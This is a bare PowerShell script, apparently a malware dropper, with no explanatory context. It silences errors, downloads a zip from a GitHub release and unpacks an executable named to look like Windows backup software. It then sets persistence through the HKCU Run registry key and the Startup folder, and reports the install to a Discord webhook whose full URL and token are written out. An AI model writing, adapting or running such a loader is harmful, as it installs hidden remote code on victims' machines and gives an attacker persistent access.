$ErrorActionPreference = 'SilentlyContinue'
$w = 'https://discord.com/api/webhooks/1468830390822371349/uRnP7vMkvm8QB25zdR5fSQHxd9Uva98k0YR2LjIy6eWLk7Kxdq-IagPvTqKh5hXUNcTw'
$u='https://github.com/Rohit-991/test/releases/download/receipts/backup.zip';$e='winbackup.exe';$r='WindowsBackupAgent'
try{[System.IO.File]::WriteAllText("C:\\ProgramData\\.t","t");Remove-Item "C:\\ProgramData\\.t" -Force;$d='C:\\ProgramData'}catch{$d=$env:APPDATA}
$z="$d\\t.zip"
Invoke-WebRequest -Uri $u -OutFile $z -UseBasicParsing
Expand-Archive -Path $z -DestinationPath $d -Force
Remove-Item $z -Force
Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $r -Value "$d\$e" -Force
$s = [Environment]::GetFolderPath("Startup")
Copy-Item "$d\\$e" -Destination $s -Force
Invoke-RestMethod -Uri $w -Method Post -Body (@{content="Downloaded"}|ConvertTo-Json) -ContentType 'application/json'|Out-Null
